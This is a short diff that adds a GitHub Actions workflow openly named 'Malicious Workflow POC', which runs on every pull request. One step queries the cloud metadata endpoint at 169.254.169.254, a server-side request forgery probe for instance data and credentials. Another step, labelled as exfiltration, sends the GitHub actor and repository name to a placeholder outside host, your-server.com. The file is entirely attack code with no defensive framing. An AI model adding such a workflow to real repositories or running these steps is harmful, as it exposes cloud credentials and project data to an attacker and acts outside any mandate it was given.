@@ -1,0 +1,12 @@
+name: Malicious Workflow POC
+on: 
+  pull_request:
+    types: [opened, synchronize, reopened]
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+    - name: SSRF Metadata
+      run: curl "http://169.254.169.254/latest/meta-data/"
+    - name: Exfil GitHub Context  
+      run: curl "https://your-server.com/log?actor=${{ github.actor }}&repo=${{ github.repository }}"
